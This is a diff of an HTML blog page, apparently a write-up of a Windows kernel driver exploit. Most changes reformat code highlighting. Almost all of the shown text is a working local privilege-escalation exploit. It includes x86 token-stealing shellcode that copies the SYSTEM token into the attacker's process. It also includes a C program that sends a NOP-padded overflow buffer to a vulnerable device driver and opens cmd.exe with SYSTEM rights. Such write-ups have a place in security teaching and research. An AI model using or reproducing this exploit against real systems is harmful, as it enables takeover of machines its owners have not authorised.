-<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>		<span class="c">; Our exploit PID</span>
+<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>     <span class="c">; Our exploit PID</span>
 <span class="k">je</span> <span class="n">exploitProcFound</span>
 
 <span class="n">nextProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[edx]</span>			<span class="c">; Next process (Flink)</span>
-<span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span>			<span class="c">; We are back at the starting point</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[edx]</span>          <span class="c">; Next process (Flink)</span>
+<span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span>            <span class="c">; We are back at the starting point</span>
 <span class="k">je</span> <span class="n">retApp</span>				
-<span class="k">jmp</span> <span class="n">searchProcess</span>		<span class="c">; We loop !</span>
+<span class="k">jmp</span> <span class="n">searchProcess</span>       <span class="c">; We loop!</span>
 
 <span class="n">sysProcFound</span><span class="o">:</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>
@@ -672,23 +445,25 @@ With these information, we can code our shellcode. I have coded mine with the FA
 <span class="k">je</span> <span class="n">nextProcess</span>
 <span class="k">cmp</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">dword</span> <span class="mh">0xFFFFFFFF</span>
 <span class="k">je</span> <span class="n">nextProcess</span>
-<span class="c">; On copie le token SYSTEM</span>
-<span class="k">pop</span> <span class="n">edi</span>					<span class="c">; Exploit</span>
-<span class="k">pop</span> <span class="n">esi</span>					<span class="c">; System</span>
-<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span>	<span class="c">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
+
+<span class="c">; We copy the SYSTEM token</span>
+<span class="k">pop</span> <span class="n">edi</span>                 <span class="c">; Exploit</span>
+<span class="k">pop</span> <span class="n">esi</span>	                <span class="c">; System</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span>   <span class="c">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
 
 <span class="n">retApp</span><span class="o">:</span>
 <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
-<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3B</span>			<span class="c">; FS address in userland</span>
+<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3B</span>            <span class="c">; FS address in userland</span>
 <span class="k">mov</span> <span class="n">fs</span><span class="p">,</span> <span class="n">ax</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>		<span class="c">; Stack address</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>		<span class="c">; Address of our function in our process</span>
-<span class="k">sysexit</span></code></pre></figure>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>     <span class="c">; Stack address</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>     <span class="c">; Address of our function in our process</span>
+<span class="k">sysexit</span>
+</code></pre></div></div>
 
 <h2 id="final-exploit">Final exploit</h2>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
 #include &lt;winioctl.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -719,15 +494,15 @@ With these information, we can code our shellcode. I have coded mine with the FA
     <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Code to execute with SYSTEM's right
-//
-</span><span class="kt">void</span> <span class="nf">sysCode</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// Code to execute with SYSTEM's right</span>
+<span class="c1">//</span>
+<span class="kt">void</span> <span class="nf">sysCode</span><span class="p">()</span> <span class="p">{</span>
     <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
 
     <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="kt">int</span> <span class="n">findStack</span><span class="p">(){</span>
+<span class="kt">int</span> <span class="nf">findStack</span><span class="p">()</span> <span class="p">{</span>
     <span class="n">DWORD</span> <span class="n">stack</span><span class="p">;</span>
 
     <span class="kr">__asm</span> <span class="n">mov</span> <span class="n">stack</span><span class="p">,</span> <span class="n">esp</span>
@@ -735,8 +510,7 @@ With these information, we can code our shellcode. I have coded mine with the FA
     <span class="k">return</span> <span class="n">stack</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
-<span class="p">{</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
     <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
     <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
@@ -747,15 +521,15 @@ With these information, we can code our shellcode. I have coded mine with the FA
         <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
     <span class="p">}</span>
 
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span>    <span class="c1">// Process PID
-</span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x42424242</span><span class="p">,</span> <span class="n">findStack</span><span class="p">());</span>              <span class="c1">// Stack address
-</span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="n">sysCode</span><span class="p">);</span>                  <span class="c1">// Code to execute with SYSTEM's right
-</span>    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span>    <span class="c1">// Process PID</span>
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x42424242</span><span class="p">,</span> <span class="n">findStack</span><span class="p">());</span>              <span class="c1">// Stack address</span>
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="n">sysCode</span><span class="p">);</span>                  <span class="c1">// Code to execute with SYSTEM's right</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
 
-    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding
-</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01\x01\x01\x01\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address
-</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span>                       <span class="c1">// Padding</span>
+    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01\x01\x01\x01\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>   <span class="c1">// Shellcode address</span>
+    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
 
     <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
@@ -767,7 +541,8 @@ With these information, we can code our shellcode. I have coded mine with the FA
     <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
 			</div>
 		</div>
